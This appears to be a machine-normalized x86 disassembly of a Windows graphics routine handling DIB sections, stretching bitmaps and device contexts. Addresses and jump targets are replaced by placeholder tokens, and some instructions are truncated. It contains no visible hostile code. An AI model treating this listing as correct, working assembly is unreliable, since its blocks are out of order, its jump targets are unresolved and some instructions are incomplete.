call [ SetFilePointer@IAT ]
mov edi [ ebp + 0x38 ]
test edi edi
jne r-xdata
push edi
push 0x2
call [ LocalAlloc@IAT ]
test eax eax
mov [ ebp + 0x4 ] eax
je r-xdata
push 0x0
push 0x0
lea ebx [ ebp + 0x20 ]
push ebx
push 0x0
lea eax [ ebp + 0x24 ]
push eax
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ ebp + 0x18 ] eax
je r-xdata
push eax
call [ LocalLock@IAT ]
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ ebp + 0x1c ] eax
je r-xdata
push 0x0
lea edx [ esp + 0x30 ]
push edx
push edi
push eax
push esi
call ebx
mov ebp [ ebp + 0x4 ]
test ebp ebp
je r-xdata
mov ecx [ ebp + 0x18 ]
push ecx
push eax
call [ SelectObject@IAT ]
mov eax [ ebx ]
mov ebx [ ReadFile@IAT ]
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov edx [ esp + 0x2c ]
xor eax eax
cmp edi edx
setne al
pop edi
pop esi
pop ebp
pop ebx
inc eax
add esp 0x14
retn 0x1c
push ebp
call [ LocalUnlock@IAT ]
test eax eax
je r-xdata
sub_441600
push 0xffffffff
push sub_4c0368
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x78 ] 0x0
je r-xdata
push esi
push edi
call sub_43d170
push rw-data
push r--data
push 0x17
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
mov esi [ esp + 0x88 ]
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
add esp 0x7c
retn
push 0x0
push r--data
push r--data
push esi
call [ MessageBoxA@IAT ]
call sub_43d170
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x78 ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x7c
retn
mov eax [ rw-data ]
mov ecx [ eax ]
push 0x0
push eax
call [ ecx + 0x48 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
push 0x8
push esi
push eax
call [ edx + 0x50 ]
test eax eax
jne r-xdata
push 0x0
push rw-data
mov ecx 0x1b
lea edi [ esp + 0x14 ]
[ edi ]
mov eax [ rw-data ]
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x18 ] 0x6c
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x80 ] 0x4200
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
test eax eax
jne r-xdata
push 0x0
mov ecx 0x5f
mov edi rw-data
[ edi ]
mov eax [ rw-data ]
push rw-data
mov [ rw-data ] 0x17c
mov ecx [ eax ]
push eax
call [ ecx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test ah 0x8
je r-xdata
push 0x0
push esi
call sub_43ff60
add esp 0x8
test eax eax
je r-xdata
mov ecx rw-data
call sub_401420
pop edi
mov eax 0x1
pop esi
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
add esp 0x7c
retn
sub_441790
push ebx
mov ebx ecx
mov ecx [ ebx + 0x10 ]
push ebp
push esi
push edi
mov [ ebx + 0x450 ] ecx
mov ecx [ ebx + 0x14 ]
lea eax [ ebx + 0x450 ]
mov [ ebx + 0x454 ] ecx
lea edx [ ebx + 0x454 ]
lea ebp [ ebx + 0x45c ]
lea esi [ ebx + 0x24 ]
mov ecx 0x10a
mov edi ebp
[ edi ] [ esi ]
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0xd48 ]
lea ecx [ ebx + 0x44c ]
mov [ ecx ] esi
mov esi [ esp + 0x14 ]
push esi
push ebp
push ecx
push edx
push eax
push ecx
mov [ esp + 0x2c ] esp
mov eax esp
lea edx [ esp + 0x2c ]
inc edi
mov [ ebx + 0xd48 ] edi
push edx
mov [ eax ] ebx
call sub_41b6c0
mov eax [ eax ]
add esp 0x1c
test eax eax
je r-xdata
mov ecx [ ebx + 0x884 ]
test ecx ecx
je r-xdata
inc [ eax ]
mov [ ebx + 0x884 ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ebx + 0x884 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
mov ecx [ eax + 0x8 ]
pop edi
pop esi
add edx ecx
pop ebp
mov [ ebx + 0x458 ] edx
mov eax 0x1
pop ebx
retn 0x4
mov [ ebx + 0x458 ] eax
mov [ ebx + 0x888 ] 0x1
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
sub_441880
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c03b6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x900
push ebx
push esi
mov ebx ecx
xor esi esi
cmp ebx esi
push edi
mov [ esp + 0xc ] ebx
je r-xdata
mov eax [ ebx + 0x20 ]
cmp eax esi
mov [ esp + 0x914 ] esi
je r-xdata
cmp [ ebx + 0x8 ] esi
jne r-xdata
dec [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp edx esi
jle r-xdata
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
cmp [ ebx + 0x8 ] esi
jge r-xdata
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
push eax
call [ LocalLock@IAT ]
mov [ ebx + 0x20 ] eax
mov ecx [ esp + 0x90c ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebx + 0x8 ] esi
push eax
call [ LocalUnlock@IAT ]
mov [ ebx + 0x20 ] esi
cmp edx 0x2710
jg r-xdata
cmp ecx 0x2710
jg r-xdata
mov cl [ ebp + 0x14 ]
test cl cl
je r-xdata
mov ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x10 ]
mov [ esp + 0x34 ] ecx
mov ecx ebx
mov [ esp + 0x30 ] edx
mov [ esp + 0x20 ] eax
call sub_40b280
mov ecx ebx
mov [ esp + 0x18 ] eax
call sub_40b2d0
mov edi [ ebx + 0xc ]
lea esi [ ebx + 0x24 ]
mov al [ ebx + 0x888 ]
test al al
jne r-xdata
lea ecx [ esp + 0x50 ]
call sub_439410
cmp [ ebp + 0x10 ] 0x1
mov [ esp + 0x914 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x14 ]
jne r-xdata
lea ecx [ esp + 0xc ]
call sub_435880
mov eax 0x1
mov ecx [ esp + 0x90c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
cmp [ ebx + 0x884 ] esi
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
push 0x0
push 0x0
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x30 ]
push 0x0
push 0x0
push eax
push ecx
push edx
push esi
push edi
lea ecx [ esp + 0x7c ]
call sub_43ba10
test eax eax
jne r-xdata
call sub_43abf0
test eax eax
jne r-xdata
mov al [ ebp + 0x20 ]
test al al
je r-xdata
mov eax [ ebx + 0x884 ]
mov ecx [ ebx + 0x450 ]
mov edx [ ebx + 0x454 ]
mov edi [ ebx + 0x44c ]
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov [ esp + 0x34 ] edx
mov edx [ eax + 0x8 ]
add edx ecx
mov [ esp + 0x20 ] edx
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
mov edx [ eax + 0x18 ]
add edx ecx
mov ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov eax [ eax + 0x1c ]
mov [ esp + 0x18 ] edx
add eax ecx
lea esi [ ebx + 0x45c ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
push eax
mov ecx ebx
call sub_441790
test eax eax
je r-xdata
lea ecx [ esp + 0x50 ]
call sub_43a1f0
mov eax [ esp + 0x47c ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x490 ]
cmp eax 0x20000018
mov ecx 0x10a
lea esi [ esp + 0x50 ]
lea edi [ esp + 0x4e0 ]
[ edi ] [ esi ]
mov cx [ esp + 0x5e ]
mov [ esp + 0x24 ] eax
je r-xdata
cmp edi 0x10000001
je r-xdata
lea ecx [ esp + 0xc ]
call sub_435880
mov eax 0x1
mov ecx [ esp + 0x90c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ esp + 0x10 ] eax
cmp edx [ ebx + 0x10 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x24 ] edi
jne r-xdata
lea ecx [ esp + 0xc ]
call sub_435880
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ eax + eax * 2 + 0x10 ]
cmp eax 0x10000018
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x20 ]
push 0x0
push 0x1
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push esi
push edi
lea ecx [ esp + 0x7c ]
call sub_43ba10
test eax eax
jne r-xdata
cmp edi 0x10000010
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esp + 0x10 ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x24 ]
push ecx
mov ecx [ esp + 0x30 ]
push 0x0
push 0x0
push edx
push eax
push ecx
push esi
push edi
lea ecx [ ebx + 0x890 ]
call sub_43ba10
mov ecx [ ebp + 0xc ]
mov eax [ esp + 0x10 ]
push 0x1
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x2c ]
push 0x0
push 0x0
push eax
push ecx
push edx
push esi
push edi
lea ecx [ ebx + 0x890 ]
call sub_43ce20
jmp r-xdata
push 0x0
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x4c ] esi
push edi
je r-xdata
movzx eax cx
imul eax [ ebp + 0x8 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0xf
jmp r-xdata
mov edx [ esp + 0x47c ]
mov edi [ esp + 0x490 ]
lea esi [ esp + 0x50 ]
mov [ esp + 0x14 ] esi
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] edi
mov ecx [ ebp + 0xc ]
mov eax edi
and eax 0xff
cmp edi 0x2000000c
mov [ esp + 0x4c ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x44 ] eax
mov [ esp + 0x28 ] ecx
jg r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0xd28 ] edx
mov [ ebx + 0xd2c ] eax
call [ DeleteObject@IAT ]
push esi
call [ SelectObject@IAT ]
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
and eax 0xfffffff0
shl eax 0x3
movzx ecx cx
cdq
idiv ecx
mov edx [ ebp + 0xc ]
push 0x0
push 0x0
lea ecx [ esp + 0x4e8 ]
mov [ esp + 0x4f0 ] edx
mov [ esp + 0x4ec ] eax
lea eax [ esp + 0x24 ]
push eax
push 0x0
push ecx
push 0x0
call [ CreateDIBSection@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x14 ] edi
je r-xdata
mov ecx edi
sub ecx 0x20000010
je r-xdata
je r-xdata
push 0x4
push esi
call [ SetStretchBltMode@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call [ SetBrushOrgEx@IAT ]
push 0x3
push esi
call [ SetStretchBltMode@IAT ]
jmp r-xdata
inc eax
and eax 0xfffffffe
mov [ esp + 0x44 ] eax
lea eax [ eax + eax + 0xf ]
sub ecx 0x8
je r-xdata
add eax 0x7
and eax 0xfffffff8
mov [ esp + 0x44 ] eax
add eax 0xf
and eax 0xfffffff0
mov [ esp + 0x2c ] eax
mov [ esp + 0x48 ] eax
movzx eax [ esi + 0xe ]
imul eax [ esi + 0x4 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
inc ecx
and ecx 0xfffffffe
add eax 0x3
and eax 0xfffffffc
mov [ esp + 0x40 ] eax
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx edi
sub ecx 0x10000018
je r-xdata
mov ecx ebx
call sub_43d760
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x14 ]
lea edi [ ebx + 0x24 ]
mov ecx 0x10a
lea esi [ esp + 0x4e0 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x4c ]
mov [ ebx + 0xc ] edx
mov edx [ esp + 0x1c ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x14 ] ecx
mov al [ ebp + 0x1c ]
test al al
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x34 ]
push 0xcc0020
push 0x0
lea edx [ esp + 0x58 ]
push edx
mov edx [ esp + 0x3c ]
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push 0x0
push 0x0
push eax
push ecx
push 0x0
push 0x0
push esi
call [ StretchDIBits@IAT ]
mov [ esp + 0x3c ] eax
mov al [ ebp + 0x20 ]
test al al
je r-xdata
mov ecx [ esp + 0x2c ]
movzx esi [ esp + 0x4ee ]
mov eax ecx
cdq
shr esi 0x3
idiv esi
mov [ esp + 0x4e4 ] eax
mov eax [ esp + 0x14 ]
mov edx [ eax + 0x8 ]
test edx edx
mov eax [ esp + 0x28 ]
jge r-xdata
mov esi [ esp + 0x2c ]
movzx ecx [ esp + 0x4ee ]
mov eax esi
cdq
shr ecx 0x3
idiv ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x4e4 ] eax
mov eax [ edx + 0x8 ]
test eax eax
mov eax ecx
cdq
jge r-xdata
cmp edi 0x20000018
je r-xdata
sub ecx 0x20000008
jne r-xdata
cmp [ esp + 0x24 ] 0x2000000c
mov esi [ esp + 0x14 ]
mov [ esp + 0x10 ] ecx
mov ecx 0x10a
lea edi [ esp + 0x4e0 ]
[ edi ] [ esi ]
jne r-xdata
sub ecx 0x8
je r-xdata
lea ecx [ esp + 0x50 ]
call sub_43a1f0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ esp + 0x1c ]
push 0x0
push 0x0
push ecx
push edx
mov edx [ esp + 0x4a0 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
lea ecx [ esp + 0x504 ]
push ecx
push edx
lea ecx [ ebx + 0x890 ]
call sub_43ba10
push esi
mov [ ebx + 0xd20 ] edi
call [ DeleteDC@IAT ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x1c ]
push 0x1
push edx
push eax
mov eax [ esp + 0x49c ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
lea edx [ esp + 0x500 ]
push edx
push eax
lea ecx [ ebx + 0x890 ]
call sub_43ce20
push esi
call [ DeleteDC@IAT ]
push edi
call [ DeleteObject@IAT ]
jmp r-xdata
mov [ esp + 0x4e8 ] eax
mov edx eax
neg edx
mov [ esp + 0x4e8 ] edx
jmp r-xdata
sub eax edx
sar eax 0x1
lea edx [ eax + eax * 2 ]
mov [ esp + 0x4e8 ] edx
sub eax edx
sar eax 0x1
neg eax
lea eax [ eax + eax * 2 ]
mov [ esp + 0x4e8 ] eax
jmp r-xdata
lea eax [ eax + eax * 2 + 0x3 ]
add eax 0xf
jmp r-xdata
cmp edi 0x10000018
je r-xdata
sub ecx 0xfffffe8
jne r-xdata
mov eax [ esp + 0x3c ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebx + 0xd28 ] eax
mov [ ebx + 0xd2c ] ecx
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0x4f0 ]
push ecx
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
imul ecx eax
add ecx 0xf
push ecx
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ ebx + 0xd24 ] eax
je r-xdata
mov dl [ ebp + 0x20 ]
test dl dl
je r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
push 0x0
lea edx [ esp + 0x4f0 ]
push edx
push 0x0
call [ CreateDIBSection@IAT ]
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
mov eax ecx
cdq
sub eax edx
sar eax 0x1
imul eax esi
add eax 0x5
lea eax [ eax + eax * 2 ]
push eax
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ ebx + 0xd24 ] eax
je r-xdata
mov al [ ebp + 0x20 ]
test al al
je r-xdata
and eax 0xfffffff0
mov [ esp + 0x2c ] eax
movzx eax [ esi + 0xe ]
imul eax [ esi + 0x4 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
xor ecx ecx
add eax 0x3
and eax 0xfffffffc
mov [ esp + 0x48 ] ecx
mov [ esp + 0x40 ] eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x18 ] ecx
shl eax 0x2
add eax 0xf
jmp r-xdata
add eax 0x3
and eax 0xfffffffc
mov [ esp + 0x44 ] eax
add eax 0xf
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea ecx [ eax + 0xf ]
and ecx 0xfffffff0
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea ecx [ eax + 0xf ]
and ecx 0xfffffff0
mov [ esp + 0x1c ] ecx
jmp r-xdata
call [ rw-data ]
test eax eax
je r-xdata
call [ rw-data ]
test eax eax
je r-xdata
xor esi esi
xor edi edi
mov al [ ebp + 0x20 ]
mov edx [ ebp + 0x24 ]
push edx
mov edx [ esp + 0x50 ]
test al al
mov eax [ ebp + 0x10 ]
push eax
mov eax [ esp + 0x40 ]
push edx
mov edx [ esp + 0x4c ]
push eax
mov eax [ esp + 0x44 ]
push edx
mov edx [ esp + 0x44 ]
push eax
mov eax [ esp + 0x28 ]
push edx
mov edx [ esp + 0x34 ]
push eax
mov eax [ esp + 0x40 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push edx
mov edx [ esp + 0x74 ]
push eax
mov eax [ esp + 0x5c ]
push 0x0
push 0x0
push edx
mov edx [ esp + 0x64 ]
push eax
mov eax [ esp + 0x84 ]
push edx
push eax
push 0x0
push 0x0
push edi
push esi
mov [ esp + 0x94 ] ecx
push ecx
je r-xdata
mov eax [ esp + 0x2c ]
mov esi eax
imul esi [ esp + 0x28 ]
cdq
sub eax edx
mov edi eax
add esi ecx
sar edi 0x1
add edi esi
jmp r-xdata
mov ecx ebx
call sub_43d760
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
lea edi [ ebx + 0x24 ]
mov ecx 0x10a
lea esi [ esp + 0x4e0 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x24 ]
mov [ ebx + 0xc ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x18 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x10 ] ecx
mov [ ebx + 0x14 ] edx
mov ecx [ esp + 0x14 ]
push ecx
mov al [ ebp + 0x1c ]
mov ecx [ esp + 0x3c ]
mov edx [ ebp + 0xc ]
test al al
mov eax [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebx + 0xd24 ]
push ecx
call j_sub_4b66ed
add esp 0x4
mov [ ebx + 0xd24 ] 0x0
jmp r-xdata
push 0x0
push 0x0
push edx
push eax
mov eax [ esp + 0x34 ]
push 0x0
push 0x0
push edi
push esi
push ecx
lea edx [ esp + 0x504 ]
push edx
push eax
lea ecx [ ebx + 0x890 ]
call sub_43ba10
push 0x1
push edx
push eax
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push edi
push esi
push ecx
lea edx [ esp + 0x500 ]
push edx
push eax
lea ecx [ ebx + 0x890 ]
call sub_43ce20
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0xd28 ] edx
mov [ ebx + 0xd2c ] eax
jmp r-xdata
mov ecx [ ebx + 0xd24 ]
push ecx
call j_sub_4b66ed
add esp 0x4
mov [ ebx + 0xd24 ] 0x0
mov eax [ ebx + 0xcb8 ]
test eax eax
je r-xdata
sub_4421e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4c03e1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf38
push ebx
push esi
mov esi ecx
mov eax [ esi + 0xd30 ]
test eax eax
push edi
mov [ esp + 0x5c ] esi
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
mov [ esp + 0x18 ] esi
jne r-xdata
mov ecx [ esi + 0xd3c ]
test ecx ecx
je r-xdata
inc [ esi + 0x8 ]
mov ecx [ ebp + 0x1c ]
test ecx ecx
mov ebx [ ebp + 0x14 ]
mov [ esp + 0xf4c ] 0x0
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
mov ecx esi
call sub_43ee40
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax 0x1
mov ecx [ esp + 0xf44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
mov eax [ esi + 0xd40 ]
sub eax ecx
sar eax 0x3
test eax eax
jne r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
jge r-xdata
mov edx [ ebp + 0xc ]
sub edx ecx
add ebx ecx
xor ecx ecx
mov [ ebp + 0xc ] edx
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x1c ] ecx
push eax
call [ LocalLock@IAT ]
mov [ esi + 0x20 ] eax
mov ebx [ esi + 0x10 ]
test ebx ebx
jbe r-xdata
mov edi [ ebp + 0x18 ]
sub [ ebp + 0x10 ] eax
mov edi [ ebp + 0x18 ]
add edi eax
xor eax eax
mov [ ebp + 0x18 ] edi
mov [ ebp + 0x20 ] eax
jmp r-xdata
mov ecx [ esp + 0xf44 ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x3c
mov eax [ esi + 0x14 ]
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x28 ]
lea edx [ edi + eax ]
cmp edx ecx
jle r-xdata
mov ebx [ ebp + 0x24 ]
sub ebx ecx
mov [ ebp + 0x14 ] ebx
lea edx [ ebx + ecx ]
cmp edx [ ebp + 0x24 ]
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
mov al [ ebp + 0x30 ]
test al al
je r-xdata
mov edi ecx
sub edi eax
mov [ ebp + 0x18 ] edi
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
mov edx [ esi + 0x20 ]
mov [ esp + 0x5c ] ecx
mov ecx esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] edx
call sub_40b280
mov ecx esi
mov [ esp + 0x30 ] eax
call sub_40b2d0
mov edi [ esi + 0xc ]
lea ebx [ esi + 0x24 ]
mov al [ esi + 0x888 ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edi [ rw-data ]
xor edx edx
test eax eax
mov [ esp + 0x68 ] edi
mov [ esp + 0x10 ] edx
je r-xdata
mov ecx [ esi + 0xd28 ]
mov edx [ ebp + 0x24 ]
cmp edx ecx
jne r-xdata
mov eax [ esi + 0xd24 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x884 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x18 ]
call sub_435880
mov eax 0x1
mov ecx [ esp + 0xf44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
test ebx ebx
fild [ ebp + 0x24 ]
mov [ esp + 0x1c ] ebx
fild [ esp + 0x1c ]
jge r-xdata
mov ecx [ rw-data ]
imul ecx edi
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x10 ] edx
mov ecx [ ebp + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xd2c ]
cmp [ ebp + 0x28 ] eax
jne r-xdata
mov eax [ esi + 0xcb8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x450 ]
mov ecx [ esi + 0x454 ]
mov [ esp + 0x4c ] eax
mov eax [ esi + 0x884 ]
mov edx [ eax + 0x4 ]
mov edi [ eax + 0x8 ]
mov [ esp + 0x5c ] ecx
mov ecx [ edx ]
add edi ecx
mov [ esp + 0x50 ] edi
mov edi [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
mov ecx edx
mov ecx [ ecx ]
add edi ecx
mov ecx [ edx ]
mov [ esp + 0x30 ] edi
mov edi [ esi + 0x44c ]
add eax ecx
lea ebx [ esi + 0x45c ]
jmp r-xdata
mov eax [ ebp + 0x34 ]
push eax
mov ecx esi
call sub_441790
test eax eax
jne r-xdata
mov ecx [ rw-data ]
fdivp st1
add ecx edx
add ecx edi
mov [ esp + 0x24 ] ecx
mov ecx [ rw-data ]
mov eax 0x51eb851f
imul ecx edi
fstp [ esp + 0x70 ]
fild [ esp + 0x24 ]
fmul [ esp + 0x70 ]
imul ecx
fstp [ esp + 0xa0 ]
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x24 ] edx
fild [ esp + 0x24 ]
fmul [ esp + 0x70 ]
fstp [ esp + 0xb0 ]
fild [ esp + 0x68 ]
fst [ esp + 0xe8 ]
fmul [ esp + 0x70 ]
fstp [ esp + 0x88 ]
mov ecx [ esp + 0x8c ]
mov edx [ esp + 0x88 ]
push ecx
push edx
call sub_452510
mov ebx eax
add esp 0x8
test ebx ebx
mov [ esp + 0x54 ] ebx
jne r-xdata
fadd [ r--data ]
mov eax [ esp + 0x4c ]
test eax eax
jle r-xdata
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
cmp eax edx
jle r-xdata
mov edi [ esi + 0xcd0 ]
mov [ esp + 0x5c ] eax
mov eax [ esi + 0xcbc ]
mov [ esp + 0x4c ] ecx
mov ecx [ esi + 0xcc0 ]
mov [ esp + 0x50 ] eax
mov eax [ esi + 0xcc4 ]
lea ebx [ esi + 0x890 ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x28 ] eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x34 ] edi
jmp r-xdata
mov edx [ ebp + 0x24 ]
mov [ esp + 0x28 ] eax
mov eax [ esi + 0xd20 ]
test eax eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x34 ] edi
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ esp + 0xb8 ] ecx
add ecx ebx
mov [ esp + 0xc0 ] ecx
push 0x15
lea ecx [ esp + 0xbc ]
mov [ esp + 0xc0 ] eax
push ecx
add eax edi
push edx
mov [ esp + 0xd0 ] eax
call [ FillRect@IAT ]
lea ecx [ esp + 0x18 ]
call sub_435880
jmp r-xdata
fld [ esp + 0x88 ]
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
call sub_452510
fild [ esp + 0x18 ]
fmul [ esp + 0x78 ]
fstp [ esp + 0x90 ]
mov eax [ esp + 0x94 ]
mov ecx [ esp + 0x90 ]
push eax
push ecx
call sub_452510
fild [ rw-data ]
add esp 0x8
mov [ esp + 0x28 ] eax
fmul [ esp + 0x78 ]
fstp [ esp ]
call sub_452510
fild [ rw-data ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
mov [ ebp + 0x1c ] ecx
fmul [ esp + 0x78 ]
fstp [ esp ]
call sub_452510
mov ecx [ ebp + 0x20 ]
mov edx [ rw-data ]
sub ecx eax
mov eax [ rw-data ]
add eax edx
mov [ esp + 0x18 ] eax
fild [ esp + 0x18 ]
mov [ ebp + 0x20 ] ecx
fmul [ esp + 0x78 ]
fstp [ esp ]
call sub_452510
mov edx [ ebp + 0x24 ]
mov ecx [ rw-data ]
sub edx eax
mov [ ebp + 0x24 ] edx
mov edx [ rw-data ]
add edx ecx
mov [ esp + 0x18 ] edx
fild [ esp + 0x18 ]
fmul [ esp + 0x78 ]
fstp [ esp ]
call sub_452510
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov [ esp + 0xc0 ] eax
add eax edx
mov [ esp + 0xc8 ] eax
